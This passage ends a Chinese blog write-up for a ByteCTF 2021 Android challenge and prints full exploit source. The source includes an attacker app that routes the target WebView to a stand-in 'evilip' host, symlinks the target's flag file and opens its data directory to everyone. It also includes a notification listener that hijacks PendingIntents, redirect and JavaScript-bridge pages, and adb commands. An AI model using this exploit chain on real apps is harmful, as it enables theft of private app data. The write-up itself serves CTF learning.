+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">AppCompatActivity</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">target</span> <span class="o">=</span> <span class="s">&#34;com.bytectf.mediumdroid&#34;</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">evil</span> <span class="o">=</span> <span class="s">&#34;http://evilip/&#34;</span><span class="o">;</span>
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+        <span class="n">startService</span><span class="o">(</span><span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">MagicService</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+
+        <span class="n">launch</span><span class="o">(</span><span class="n">evil</span> <span class="o">+</span> <span class="s">&#34;callTe3t.html&#34;</span><span class="o">);</span>
+
+        <span class="k">new</span> <span class="n">Handler</span><span class="o">().</span><span class="na">postDelayed</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
+            <span class="nd">@Override</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
+                <span class="n">launch</span><span class="o">(</span><span class="s">&#34;file://&#34;</span> <span class="o">+</span> <span class="n">symlink</span><span class="o">());</span>
+            <span class="o">}</span>
+        <span class="o">},</span> <span class="n">5000</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">launch</span><span class="o">(</span><span class="n">String</span> <span class="n">url</span><span class="o">){</span>
+        <span class="n">Intent</span> <span class="n">main_intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+        <span class="n">main_intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="n">target</span> <span class="o">+</span> <span class="s">&#34;.MainActivity&#34;</span><span class="o">);</span>
+        <span class="n">main_intent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span>
+                <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_PREFIX_URI_PERMISSION</span>
+                <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span>
+                <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_WRITE_URI_PERMISSION</span><span class="o">);</span>
+
+        <span class="n">Intent</span> <span class="n">test_intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+        <span class="n">test_intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="n">target</span> <span class="o">+</span> <span class="s">&#34;.TestActivity&#34;</span><span class="o">);</span>
+        <span class="n">test_intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;url&#34;</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">test_intent_uri</span> <span class="o">=</span> <span class="n">test_intent</span><span class="o">.</span><span class="na">toUri</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">URI_INTENT_SCHEME</span><span class="o">);</span>
+
+        <span class="n">main_intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;http://toutiao.com@evilip/jump.html?url=&#34;</span> <span class="o">+</span> <span class="n">Uri</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">test_intent_uri</span><span class="o">)));</span>
+        <span class="n">startActivity</span><span class="o">(</span><span class="n">main_intent</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="n">String</span> <span class="nf">symlink</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">root</span> <span class="o">=</span> <span class="n">getApplicationInfo</span><span class="o">().</span><span class="na">dataDir</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">symlink</span> <span class="o">=</span> <span class="n">root</span> <span class="o">+</span> <span class="s">&#34;/symlink.html&#34;</span><span class="o">;</span>
+        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">&#34;url&#34;</span><span class="o">,</span> <span class="n">symlink</span><span class="o">);</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">String</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getApplicationInfo</span><span class="o">(</span><span class="n">target</span><span class="o">,</span>
+                    <span class="n">0</span><span class="o">).</span><span class="na">dataDir</span> <span class="o">+</span> <span class="s">&#34;/files/flag&#34;</span><span class="o">;</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;rm &#34;</span> <span class="o">+</span> <span class="n">symlink</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;ln -s &#34;</span> <span class="o">+</span> <span class="n">cookies</span> <span class="o">+</span> <span class="s">&#34; &#34;</span> <span class="o">+</span> <span class="n">symlink</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod -R 777 &#34;</span> <span class="o">+</span> <span class="n">root</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
+
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">symlink</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>MagicService:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MagicService</span> <span class="kd">extends</span> <span class="n">NotificationListenerService</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">target</span> <span class="o">=</span> <span class="s">&#34;com.bytectf.mediumdroid&#34;</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">&#34;xss payload&#34;</span><span class="o">;</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">()</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">();</span>
+        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;onCreate&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onListenerConnected</span><span class="o">()</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onListenerConnected</span><span class="o">();</span>
+        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;onListen&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@RequiresApi</span><span class="o">(</span><span class="n">api</span> <span class="o">=</span> <span class="n">Build</span><span class="o">.</span><span class="na">VERSION_CODES</span><span class="o">.</span><span class="na">KITKAT</span><span class="o">)</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onNotificationPosted</span><span class="o">(</span><span class="n">StatusBarNotification</span> <span class="n">sbn</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span><span class="o">(!</span><span class="n">sbn</span><span class="o">.</span><span class="na">getPackageName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">))</span>
+            <span class="k">return</span><span class="o">;</span>
+
+        <span class="n">Notification</span> <span class="n">notification</span> <span class="o">=</span> <span class="n">sbn</span><span class="o">.</span><span class="na">getNotification</span><span class="o">();</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">notification</span><span class="o">.</span><span class="na">extras</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
+            <span class="n">PendingIntent</span> <span class="n">pendingIntent</span> <span class="o">=</span> <span class="n">notification</span><span class="o">.</span><span class="na">contentIntent</span><span class="o">;</span>
+            <span class="n">Intent</span> <span class="n">evil_intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+            <span class="n">evil_intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">&#34;com.bytectf.SET_FLAG&#34;</span><span class="o">);</span>
+            <span class="n">evil_intent</span><span class="o">.</span><span class="na">setPackage</span><span class="o">(</span><span class="n">target</span><span class="o">);</span>
+            <span class="n">evil_intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;flag&#34;</span><span class="o">,</span> <span class="n">payload</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">pendingIntent</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">evil_intent</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">PendingIntent</span><span class="o">.</span><span class="na">CanceledException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onNotificationPosted</span><span class="o">(</span><span class="n">sbn</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onNotificationRemoved</span><span class="o">(</span><span class="n">StatusBarNotification</span> <span class="n">sbn</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onNotificationRemoved</span><span class="o">(</span><span class="n">sbn</span><span class="o">);</span>
+        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;onNotificationRemoved&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>jump.html:(可以根据url参数的内容做跳转)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Jump to TestActivity<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="kd">function</span> <span class="nx">GetQueryString</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s2">&#34;(^|&amp;)&#34;</span><span class="o">+</span> <span class="nx">name</span> <span class="o">+</span><span class="s2">&#34;=([^&amp;]*)(&amp;|$)&#34;</span><span class="p">);</span>
+            <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">match</span><span class="p">(</span><span class="nx">reg</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span>
+                <span class="k">return</span>  <span class="nx">unescape</span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> 
+            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="kd">function</span> <span class="nx">doitjs</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">GetQueryString</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">doitjs</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>callTe3t.html</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>jsi test<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">jsi</span><span class="p">.</span><span class="nx">Te3t</span><span class="p">(</span><span class="s1">&#39;test1&#39;</span><span class="p">,</span> <span class="s1">&#39;test2&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Manifest.xml:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">&#34;http://schemas.android.com/apk/res/android&#34;</span>
+    <span class="na">package=</span><span class="s">&#34;com.bytectf.pwnmediumdroid&#34;</span><span class="nt">&gt;</span>
+
+    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.INTERNET&#34;</span><span class="nt">/&gt;</span>
+
+    <span class="nt">&lt;application</span>
+        <span class="na">android:allowBackup=</span><span class="s">&#34;true&#34;</span>
+        <span class="na">android:icon=</span><span class="s">&#34;@mipmap/ic_launcher&#34;</span>
+        <span class="na">android:label=</span><span class="s">&#34;@string/app_name&#34;</span>
+        <span class="na">android:roundIcon=</span><span class="s">&#34;@mipmap/ic_launcher_round&#34;</span>
+        <span class="na">android:supportsRtl=</span><span class="s">&#34;true&#34;</span>
+        <span class="na">android:theme=</span><span class="s">&#34;@style/AppTheme&#34;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;service</span>
+            <span class="na">android:name=</span><span class="s">&#34;.MagicService&#34;</span>
+            <span class="na">android:enabled=</span><span class="s">&#34;true&#34;</span>
+            <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span>
+            <span class="na">android:permission=</span><span class="s">&#34;android.permission.BIND_NOTIFICATION_LISTENER_SERVICE&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.service.notification.NotificationListenerService&#34;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+
+        <span class="nt">&lt;/service&gt;</span>
+
+        <span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&#34;.MainActivity&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.MAIN&#34;</span> <span class="nt">/&gt;</span>
+
+                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.LAUNCHER&#34;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+        <span class="nt">&lt;/activity&gt;</span>
+    <span class="nt">&lt;/application&gt;</span>
+
+<span class="nt">&lt;/manifest&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>运行的时候还要给一遍通知权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">adb shell cmd notification allow_listener com.bytectf.pwnmediumdroid/com.bytectf.pwnmediumdroid.MagicService
+</code></pre></td></tr></table>
+</div>
+</div><p>or:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">adb shell settings put secure enabled_notification_listeners %nlisteners:com.bytectf.pwnmediumdroid/com.bytectf.pwnmediumdroid.MagicService
+</code></pre></td></tr></table>
+</div>
+</div><p>结果:</p>
+<p>
+
+
+    <div class="post-img-view">
+        <a data-fancybox="gallery" href="/images/bytectf2021-pre/4.png">
+            <img src="/images/bytectf2021-pre/4.png" alt=""  />
+        </a>
+    </div>
+</p>
+<h2 id="参考链接">参考链接</h2>
+<p><a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/" target="_blank" rel="noopener noreffer">Android: Access to app protected components</a></p>
+<p><a href="https://bytedance.feishu.cn/file/boxcnWibqpknk3S708qerqHoxiP" target="_blank" rel="noopener noreffer">安卓漏洞从0到1&ndash;PPT</a></p>
+<p><a href="https://bytedance.feishu.cn/file/boxcneAJtsVQSoNusVPeJPNskkc" target="_blank" rel="noopener noreffer">安卓漏洞从0到1&ndash;视频</a></p>
+<p><a href="https://zhuanlan.kanxue.com/article-14155.htm" target="_blank" rel="noopener noreffer">2020 看雪SDC议题回顾 | Android WebView安全攻防指南2020</a></p>
+<p><a href="http://www.feidao.site/wordpress/?p=3390" target="_blank" rel="noopener noreffer">android(8)-WebView安全</a></p>
+<p><a href="https://mp.weixin.qq.com/s/fqX-ICojKhe-FBGCLhWB0A" target="_blank" rel="noopener noreffer">ByteCTF 2021 By W&amp;M（PWN）部分</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-04-02&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e" target="_blank" title="commit by LinkleYping(1056669812@qq.com) 7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e: init blog">
+                                    <i class="fas fa-hashtag fa-fw"></i>7b7305e</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/bytectf2021-pre/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://linkleyping.top/bytectf2021-pre/" data-title="Bytectf2021初赛"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://linkleyping.top/bytectf2021-pre/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://linkleyping.top/bytectf2021-pre/" data-title="Bytectf2021初赛"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://linkleyping.top/bytectf2021-pre/" data-title="Bytectf2021初赛"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://linkleyping.top/bytectf2021-pre/" data-title="Bytectf2021初赛"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/dvwa/" class="prev" rel="prev" title="DVWA Writeup"><i class="fas fa-angle-left fa-fw"></i>DVWA Writeup</a>
+            <a href="/url-bypass/" class="next" rel="next" title="Webview白名单绕过">Webview白名单绕过<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div>
+                <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+                <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+                <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+            
+
+            <div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"RFO4PNFHT1","algoliaIndex":"blog","algoliaSearchKey":"d13f32411166c6212551ffa815910ba5","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
